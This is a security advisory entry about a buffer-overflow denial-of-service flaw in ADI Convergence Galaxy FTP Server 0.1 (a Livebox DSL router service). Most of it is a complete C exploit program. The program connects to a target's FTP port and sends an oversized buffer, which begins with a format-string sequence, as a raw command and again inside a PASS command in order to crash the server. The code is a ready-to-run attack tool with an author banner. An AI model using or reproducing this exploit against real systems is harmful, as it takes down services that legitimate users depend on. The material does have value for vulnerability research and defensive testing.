source: http://www.securityfocus.com/bid/28066/info

ADI Convergence Galaxy FTP Server is prone to a denial-of-service vulnerability because the application fails to perform adequate boundary checks on user-supplied data.

An attacker can exploit this issue to crash the affected application, denying service to legitimate users. Given the nature of this issue, remote code execution may also be possible, but this has not been confirmed.

ADI Convergence Galaxy FTP Server 0.1 is vulnerable; other versions may also be affected. 

#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h> 
#include <netdb.h> 
#include <stdio.h> 
#include <unistd.h> 
#include <string.h> 

int port=21; 
struct hostent *he; 
struct sockaddr_in their_addr; 



int konekt(char *addr) 
{ 
  int sock; 

  he=gethostbyname(addr); 
  if(he==NULL) 
  { 
    printf("Unknow host!\nexiting..."); 
    return -1; 
  } 
  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) 
  { 
    perror("socket"); 
    return -2; 
  } 

  their_addr.sin_family = AF_INET;    
  their_addr.sin_port = htons(port);  
  their_addr.sin_addr = *((struct in_addr *)he->h_addr); 
  memset(&(their_addr.sin_zero), '\0', 8); 
  if (connect(sock, (struct sockaddr *)&their_addr, 
      sizeof(struct sockaddr)) == -1) 
  { 
    perror("connect"); 
    return -1; 
  } 

  return sock; 
} 

int main(int argc,char *argv[])
{
	
printf("\n+===============================Yeah======================================+");
	printf("\n+= ADI Convergence Galaxy FTP Server v1.0 (Neostrada 
Livebox DSL Router) =+");
	printf("\n+=               Remote Buffer Overflow DoS Exploit                      
=+");
	printf("\n+=                              bY                                       
=+");
	printf("\n+=        Maks M. [0in] From Dark-CodeRs Security & 
Programming Group!   =+");
        printf("\n+=                    0in(dot)email[at]gmail(dot)com                     
=+");
        printf("\n+=               Please visit: 
http://dark-coders.4rh.eu                 =+");
        printf("\n+=      Greetings to: Die_Angel, Sun8hclf, M4r1usz, 
Aristo89, Djlinux    =+");
	printf("\n+=                    MaLy, Slim, elwin013, 
Rade0n3900, Wojto111,        =+");
        printf("\n+=                    Chomzee, AfroPL, Joker186                          
=+");
	
printf("\n+===============================Yeah======================================+");

	if(argc<2)
	{
		printf("\nUse %s [IP]!\n",argv[0]);
		exit(0);
	}
	printf("\nConnecting to:%s...",argv[1]);
int sock=konekt(argv[1]);
if(sock<0)
{
	printf("\neh...");
	exit(0);
}
printf("\nConnected!!\n");
char rcv[256];
recv(sock,rcv,255,0);
printf("\n%s\n",rcv);
printf("\nSending evil buffer..");
char evil[100*100]="%n\x01\x02\x03\x04";
int i;
for(i=0;i<(100*100)-100;i++)
{
	strcat(evil,"A");
}

strcat(evil,"\r\n");
send(sock,evil,strlen(evil),0);
strcpy(rcv,"");
recv(sock,rcv,255,0);
printf("\n%s\n",rcv);
char pass[100*1000]="PASS ";
strcat(pass,evil);
strcat(pass,"\n\r");
send(sock,pass,strlen(pass),0);
strcpy(rcv,"");
recv(sock,rcv,255,0);
printf("\n%s\n",rcv);
printf("\nOK!\nYou're Livebox FTP server should fu**ed out...");

exit(0);
}